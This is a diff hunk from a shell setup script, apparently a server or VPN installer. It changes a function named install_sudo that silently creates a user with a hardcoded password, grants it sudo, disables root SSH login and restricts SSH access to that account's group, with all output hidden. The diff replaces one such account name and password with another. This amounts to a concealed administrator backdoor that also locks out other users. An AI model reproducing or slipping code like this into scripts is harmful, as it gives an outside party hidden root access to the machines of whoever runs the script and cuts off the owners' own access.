@@ -472,9 +472,9 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@F1r3n3t@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m azim 2>/dev/null; echo azim:@@MDAzim@@ | chpasswd &>/dev/null; usermod -aG sudo azim &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups azim" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
